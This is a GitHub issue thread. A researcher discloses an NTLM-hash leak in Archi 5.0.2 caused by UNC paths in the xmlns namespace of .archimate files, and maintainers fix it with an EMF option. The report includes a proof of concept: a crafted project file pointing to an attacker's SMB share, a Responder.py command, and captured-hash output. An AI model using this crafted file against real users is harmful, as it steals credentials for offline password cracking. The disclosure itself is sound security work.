### **[ncsc-pt](/ncsc-pt)** commented [Jul 14, 2023](#issue-1804755502)

| Version of Archi 5.0.2 Description When parsing the XMLNS value of an archimate project file, if the namespace does not match the expected archimate URL, the parser will access the provided resource. If the provided resource is a UNC path pointing to a share server that does not accept guest account, the host will try to authenticate on the share using the current user's session. Impact A malicious user can capture NTLM hash of the authenticated user running the application. With the captured hashes, offline password cracking can be performed in order to guess the password and gain unauthorized access to the server. Technical fix Do not allow the application’s functionality to resolve or load UNC paths. Technical Details “archimate” project are saved as XML file using the extension .archimate . The below example is an archimate project with a single BusinessActor element (John Doe) present in the “Business” folder. That element is place on the diagram “Default View” (link by the ID e79145c...).  ``` <?xml version="1.0" encoding="UTF-8"?> <archimate:model xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:archimate="http://www.archimatetool.com/archimate" name="(new model)" id="id-81d2dc112d96489ea22c7f336df894cd" version="5.0.0">   <folder name="Strategy" id="id-2ab87f8808194aafb76570f1480511a1" type="strategy"/>   <folder name="Business" id="id-2e5d95fb12be42589b1e494dfc79dd2a" type="business">     <element xsi:type="archimate:BusinessActor" name="John Doe" id="id-e79145cce35a4704a19ba22885cfc9d2"/>   </folder>   <folder name="Application" id="id-53a1acc2e38c4d7db125ccd25dc6892d" type="application"/>   <folder name="Technology &amp; Physical" id="id-24c7dc79bf11478ea65391ef16835543" type="technology"/>   <folder name="Motivation" id="id-dc391a764cd141d389af3b3b4a81a94a" type="motivation"/>   <folder name="Implementation &amp; Migration" id="id-90400d4328f448779016a63ad6eab713" type="implementation_migration"/>   <folder name="Other" id="id-276cb2473edf4874a5854257ed930166" type="other"/>   <folder name="Relations" id="id-8a1f3df198fa44c7b271f846e4fa1d12" type="relations"/>   <folder name="Views" id="id-bdcce9aa0bb64f4386ebc4ef4a90fa1b" type="diagrams">     <element xsi:type="archimate:ArchimateDiagramModel" name="Default View" id="id-fb6015c3baa2446d90238f15a70a5adb">       <child xsi:type="archimate:DiagramObject" id="id-be3e6f080b904e2496cf1d89f8965c15" archimateElement="id-e79145cce35a4704a19ba22885cfc9d2">         <bounds x="571" y="332" width="120" height="55"/>       </child>     </element>   </folder> </archimate:model>  ```  The xmlns:archimate is pointing to <http://www.archimatetool.com/archimate>. However, if the value is modified, the parser will try to access the resource, and in case a UNC is provided, the host will try to access the share drive and if need be, try to authenticate.  In the following example, the attacker is running the Responder tool ( Responder.py) listening on the interface 172.16.227.1. The archimate project file is modified so that the xmlns:archimate is pointing to \172.16.227.1\share\archimate.  ``` <?xml version="1.0" encoding="UTF-8"?> <archimate:model xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:archimate="\\172.16.227.1\share\archimate" name="(new model)" id="id-81d2dc112d96489ea22c7f336df894cd" version="5.0.0"> [...]  ```  Whenever the victim is opening the modified file, the application will try to access the resource via the host and authenticate on the fake SMB share created by Responder.py.  ``` sudo ./Responder.py -I vmnet8 [...] [+] Listening for events... [...] [SMB] NTLMv2-SSP Client: 172.16.227.169 [SMB] NTLMv2-SSP Username : LAB\tester [SMB] NTLMv2-SSP Hash: test::LAB:xxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxx[...]  ```  As seen in the output above, the NTLM hash is leaked and could be used to crack the user's password. |

| We've had a report that indicates that loading an EMF model XML file with a changed Namespace URI can lead to a possible exploit:  [archimatetool/archi#946](https://github.com/archimatetool/archi/issues/946)  Our EMF model simply declares the namespace URI, and I can't see how we can change anything in this regard. Should EMF or any of its dependencies be accessing a namespace URI in this way? Is there any way to stop that happening? |

| There is this option that you can use to turn off that behavior.  [@merks](https://github.com/merks) Thanks for the fast response! And I just found that option at the same time as you posted. :-)  I will set that option to false, but do you think that report amounts to something that is exploitable in EMF generally? |

| If I think of the 10,000 different ways that EMF loads resources from URIs then I think it's a bottomless pit. As for exploits, I think it's really up to the downstream consumer to determine if there is a risk. I.e., where do the resources come from? From some random stranger who drops by in the middling of the night? Or from the developer writing the resource.  Note that in all cases, the traffic is funneled through the org.eclipse.emf.ecore.resource.URIConverter.createInputStream(URI, Map), so anyone can place whatever controls they want or need to control which URIs are permitted. |

| If I think of the 10,000 different ways that EMF loads resources from URIs then I think it's a bottomless pit...  Yep, I agree.  For our usage, we only need the NS URI to be a unique identifier, so the actual URI is arbitrary and doesn't host any packages or artifacts. Therefore `OPTION_USE_PACKAGE_NS_URI_AS_LOCATION` set to false is perfect.  I'll close this one and thank-you for your time. :-) |
